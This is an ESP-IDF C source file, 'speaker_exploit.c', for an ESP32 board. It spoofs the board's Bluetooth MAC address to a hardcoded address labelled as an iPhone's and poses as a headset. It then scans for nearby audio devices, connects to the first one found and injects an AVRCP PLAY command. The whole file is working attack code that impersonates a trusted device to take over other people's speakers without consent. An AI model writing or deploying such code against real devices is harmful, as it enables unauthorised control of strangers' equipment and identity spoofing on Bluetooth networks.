// speaker_exploit.c - ESP-IDF project to scan for speakers and auto-inject AVRCP commands (A2DP Source mode)

#include "nvs_flash.h"
#include "esp_bt.h"
#include "esp_log.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_gap_bt_api.h"
#include "esp_a2dp_api.h"
#include "esp_avrc_api.h"
#include <string.h>
#include "bt_hci_common.h"// For UINT8_TO_STREAM macros
#include "esp_mac.h"
// f4:4e:fd:03:a6:dc

static const char *TAG = "BT_AVRCP";

static esp_bd_addr_t target_bda = {0};
static bool device_found = false;

// Hardcoded iPhone MAC address (example: replace with actual iPhone MAC)
// Format: Apple devices typically start with 34:AB:37, AC:BC:32, etc.
static uint8_t iphone_mac[6] = {0xFC, 0x9C, 0xA7, 0xA3, 0x6A, 0x43};

// Buffer for HCI commands
static uint8_t hci_cmd_buf[258];

// Only accept Audio/Video major class (0x04)
static bool is_audio_device(uint32_t cod)
{
    uint8_t major = (cod >> 8) & 0x1F;
    return (major == 0x04);
}

static void bt_app_avrc_metadata_cb(esp_avrc_ct_cb_event_t event, esp_avrc_ct_cb_param_t *param) {}

static void bt_app_gap_cb(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param)
{
    switch (event)
    {
    case ESP_BT_GAP_DISC_RES_EVT:
    {
        char bda_str[18];
        sprintf(bda_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                param->disc_res.bda[0], param->disc_res.bda[1], param->disc_res.bda[2],
                param->disc_res.bda[3], param->disc_res.bda[4], param->disc_res.bda[5]);

        ESP_LOGI(TAG, "Found device: %s", bda_str);

        uint32_t cod = 0;
        uint8_t *eir = NULL;

        for (int i = 0; i < param->disc_res.num_prop; i++)
        {
            switch (param->disc_res.prop[i].type)
            {
            case ESP_BT_GAP_DEV_PROP_COD:
                cod = *(uint32_t *)param->disc_res.prop[i].val;
                ESP_LOGI(TAG, "  Class of Device: 0x%06x", cod);
                break;
            case ESP_BT_GAP_DEV_PROP_EIR:
                eir = (uint8_t *)param->disc_res.prop[i].val;
                break;
            default:
                break;
            }
        }

        if (eir)
        {
            uint8_t len = 0;
            const uint8_t *name = esp_bt_gap_resolve_eir_data(eir, ESP_BT_EIR_TYPE_CMPL_LOCAL_NAME, &len);
            if (!name)
            {
                name = esp_bt_gap_resolve_eir_data(eir, ESP_BT_EIR_TYPE_SHORT_LOCAL_NAME, &len);
            }
            if (name)
            {
                ESP_LOGI(TAG, "  Name: %.*s", len, (char *)name);
            }
        }

        if (!device_found && is_audio_device(cod))
        {
            memcpy(target_bda, param->disc_res.bda, ESP_BD_ADDR_LEN);
            device_found = true;
            esp_bt_gap_cancel_discovery();
            ESP_LOGI(TAG, "  Target audio device selected: %s", bda_str);

            esp_a2d_source_connect(target_bda);
        }

        break;
    }
    case ESP_BT_GAP_DISC_STATE_CHANGED_EVT:
    {
        ESP_LOGI(TAG, "Discovery state changed: %d", param->disc_st_chg.state);
        break;
    }
    default:
        break;
    }
}

static void bt_app_a2d_cb(esp_a2d_cb_event_t event, esp_a2d_cb_param_t *param)
{
    switch (event)
    {
    case ESP_A2D_CONNECTION_STATE_EVT:
    {
        if (param->conn_stat.state == ESP_A2D_CONNECTION_STATE_CONNECTED)
        {
            ESP_LOGI(TAG, "Connected to A2DP device, injecting PLAY command");
            esp_avrc_ct_send_passthrough_cmd(0, ESP_AVRC_PT_CMD_PLAY, ESP_AVRC_PT_CMD_STATE_PRESSED);
            esp_avrc_ct_send_passthrough_cmd(0, ESP_AVRC_PT_CMD_PLAY, ESP_AVRC_PT_CMD_STATE_RELEASED);
        }
        else if (param->conn_stat.state == ESP_A2D_CONNECTION_STATE_DISCONNECTED)
        {
            ESP_LOGI(TAG, "Connection failed, retrying with different parameters...");
            // Implement retry with different parameters
        }
        else
        {
            ESP_LOGI(TAG, "A2DP connection state: %d", param->conn_stat.state);
        }
        break;
    }
    default:
        break;
    }
}

// Function to send raw HCI commands to ESP32 Bluetooth controller
esp_err_t send_raw_hci_command(uint16_t opcode, uint8_t *params, uint8_t param_len)
{
    uint8_t *buf = malloc(param_len + 4); // HCI command header (3) + parameters + 1 byte for length
    if (!buf)
        return ESP_ERR_NO_MEM;

    buf[0] = 0x01;                 // HCI command packet identifier
    buf[1] = opcode & 0xFF;        // OCF
    buf[2] = (opcode >> 8) & 0xFF; // OGF
    buf[3] = param_len;            // Parameter length

    if (param_len > 0)
    {
        memcpy(buf + 4, params, param_len);
    }
    if (esp_vhci_host_check_send_available())
    {
        esp_vhci_host_send_packet(buf, param_len + 4);
        free(buf);
        return ESP_OK;
    }
    else
    {
        free(buf);
        return ESP_ERR_INVALID_STATE;
    }
}

// Function to verify and print current MAC address
void verify_mac_address(void)
{
    const uint8_t *mac_addr = esp_bt_dev_get_address();
    if (mac_addr == NULL) {
        ESP_LOGE(TAG, "Failed to get Bluetooth MAC address");
        return;
    }
    
    ESP_LOGI(TAG, "Current Bluetooth MAC address: %02x:%02x:%02x:%02x:%02x:%02x",
             mac_addr[0], mac_addr[1], mac_addr[2],
             mac_addr[3], mac_addr[4], mac_addr[5]);
             
    // Compare with the spoofed MAC address
    bool match = true;
    for (int i = 0; i < 6; i++) {
        if (mac_addr[i] != iphone_mac[i]) {
            match = false;
            break;
        }
    }
    
    if (match) {
        ESP_LOGI(TAG, "MAC address verification SUCCESSFUL - Address was changed correctly");
    } else {
        ESP_LOGW(TAG, "MAC address verification FAILED - Address was not changed to requested value");
    }
}

// Properly format and send the Set MAC address command
esp_err_t spoof_mac_address_hci(uint8_t *mac_addr)
{
    uint8_t *p = hci_cmd_buf;
    
    ESP_LOGI(TAG, "Setting MAC address using vendor command: %02x:%02x:%02x:%02x:%02x:%02x",
             mac_addr[0], mac_addr[1], mac_addr[2],
             mac_addr[3], mac_addr[4], mac_addr[5]);
    
    // Format the command packet correctly
    UINT8_TO_STREAM(p, H4_TYPE_COMMAND);
    UINT16_TO_STREAM(p, 0xFC32); // Correct vendor command opcode
    UINT8_TO_STREAM(p, 6); // Parameter length
    
    // Add MAC address (ensure correct byte order)
    for (int i = 0; i < 6; i++) {
        UINT8_TO_STREAM(p, mac_addr[i]);
    }
    
    // Calculate packet size
    uint16_t sz = (uint16_t)(p - hci_cmd_buf);
    
    // Send when controller is ready
    if (esp_vhci_host_check_send_available()) {
        esp_vhci_host_send_packet(hci_cmd_buf, sz);
        return ESP_OK;
    } else {
        return ESP_ERR_INVALID_STATE;
    }
}

// Set MAC address using the official ESP-IDF base MAC address API
esp_err_t spoof_mac_address_official(uint8_t *mac_addr)
{
    ESP_LOGI(TAG, "Setting base MAC address using official API: %02x:%02x:%02x:%02x:%02x:%02x",
             mac_addr[0], mac_addr[1], mac_addr[2],
             mac_addr[3], mac_addr[4], mac_addr[5]);
    
    // This must be called before esp_bt_controller_init() or esp_wifi_init()
    esp_err_t ret = esp_base_mac_addr_set(mac_addr);
    
    if (ret == ESP_OK) {
        ESP_LOGI(TAG, "Base MAC address set successfully");
    } else {
        ESP_LOGE(TAG, "Failed to set base MAC address, error: %d", ret);
    }
    
    return ret;
}

// Set Bluetooth MAC address directly using esp_iface_mac_addr_set()
esp_err_t spoof_bt_mac_direct(uint8_t *mac_addr)
{
    ESP_LOGI(TAG, "Setting Bluetooth MAC address directly: %02x:%02x:%02x:%02x:%02x:%02x",
             mac_addr[0], mac_addr[1], mac_addr[2],
             mac_addr[3], mac_addr[4], mac_addr[5]);
    
    // Directly set the Bluetooth interface MAC address
    esp_err_t ret = esp_iface_mac_addr_set(mac_addr, ESP_MAC_BT);
    
    if (ret == ESP_OK) {
        ESP_LOGI(TAG, "Bluetooth MAC address set successfully");
    } else {
        ESP_LOGE(TAG, "Failed to set Bluetooth MAC address, error: %d", ret);
    }
    
    return ret;
}

// Define VHCI host callback functions
static void vhci_host_send_available_cb(void)
{
    // This callback is invoked when the controller is ready to send packets
}

static int vhci_host_recv_cb(uint8_t *data, uint16_t len)
{
    ESP_LOGI(TAG, "HCI callback received %d bytes", len);
    
    if (len > 0) {
        // Print raw packet data
        ESP_LOGI(TAG, "Packet type: 0x%02x", data[0]);
        
        if (data[0] == 0x04) { // HCI Event
            ESP_LOGI(TAG, "Event type: 0x%02x", data[1]);
            
            if (data[1] == 0x0E) { // Command Complete Event
                uint16_t opcode = (data[4] << 8) | data[3];
                uint8_t status = data[5];
                
                ESP_LOGI(TAG, "Command complete for opcode: 0x%04x, status: %d", opcode, status);
                
                if (opcode == 0xFC32) {
                    ESP_LOGI(TAG, "Set MAC command response: status=%d (0=success)", status);
                } else if (opcode == 0x0C03) { // HCI_RESET
                    ESP_LOGI(TAG, "Reset command response: status=%d", status);
                }
            }
        }
        
        // Dump entire packet for debugging
        ESP_LOGI(TAG, "Packet dump:");
        for (int i = 0; i < len && i < 20; i++) {
            ESP_LOGI(TAG, "  byte[%d] = 0x%02x", i, data[i]);
        }
    }
    return 0;
}

static esp_vhci_host_callback_t vhci_host_cb = {
    .notify_host_send_available = vhci_host_send_available_cb,
    .notify_host_recv = vhci_host_recv_cb,
};

// Add this at the beginning of your app_main() before any HCI operations
esp_err_t setup_vhci()
{
    esp_err_t ret;

    // Initialize controller
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    ret = esp_bt_controller_init(&bt_cfg);
    if (ret != ESP_OK)
        return ret;

    // Enable controller in Classic BT mode
    ret = esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT);
    if (ret != ESP_OK)
        return ret;

    // Register VHCI callback
    ret = esp_vhci_host_register_callback(&vhci_host_cb);
    if (ret != ESP_OK)
        return ret;

    return ESP_OK;
}

void reset_controller(void)
{
    uint8_t *p = hci_cmd_buf;
    UINT8_TO_STREAM(p, H4_TYPE_COMMAND);
    UINT16_TO_STREAM(p, HCI_RESET);
    UINT8_TO_STREAM(p, 0);
    uint16_t sz = (uint16_t)(p - hci_cmd_buf);
    
    esp_vhci_host_send_packet(hci_cmd_buf, sz);
    vTaskDelay(pdMS_TO_TICKS(500)); // Wait for reset to complete
}

void app_main(void)
{
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND)
    {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    
    // Direct method to set BT MAC address before controller initialization
    ESP_ERROR_CHECK(spoof_bt_mac_direct(iphone_mac));
    
    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_BLE));
    
    // Initialize controller after setting MAC
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT));
    
    // Register VHCI callback if needed for other purposes
    ESP_ERROR_CHECK(esp_vhci_host_register_callback(&vhci_host_cb));
    
    ESP_ERROR_CHECK(esp_bluedroid_init());
    ESP_ERROR_CHECK(esp_bluedroid_enable());
    
    // Rest of your initialization...

    ESP_ERROR_CHECK(esp_bt_gap_register_callback(bt_app_gap_cb));

    // Initialize AVRCP first
    ESP_ERROR_CHECK(esp_avrc_ct_init());
    ESP_ERROR_CHECK(esp_avrc_ct_register_callback(bt_app_avrc_metadata_cb));

    // Then initialize A2DP
    ESP_ERROR_CHECK(esp_a2d_register_callback(bt_app_a2d_cb));
    ESP_ERROR_CHECK(esp_a2d_source_init());

    ESP_ERROR_CHECK(esp_bt_dev_set_device_name("ESP32_AVRCP_INJECTOR"));
    esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);

    // Add this to your code before starting discovery
    esp_bt_sp_param_t param_type = ESP_BT_SP_IOCAP_MODE;
    esp_bt_io_cap_t iocap = ESP_BT_IO_CAP_IO;
    esp_bt_gap_set_security_param(param_type, &iocap, sizeof(uint8_t));

    // Set to audio device class - should be added before discovery
    esp_bt_cod_t cod;
    cod.major = 4;        // Audio
    cod.minor = 4;        // Wearable Headset Device
    cod.service = 0x24;   // Rendering, Capturing
    esp_bt_gap_set_cod(cod, ESP_BT_SET_COD_MAJOR_MINOR);

    ESP_LOGI(TAG, "Starting device discovery");
    esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 10, 0);
}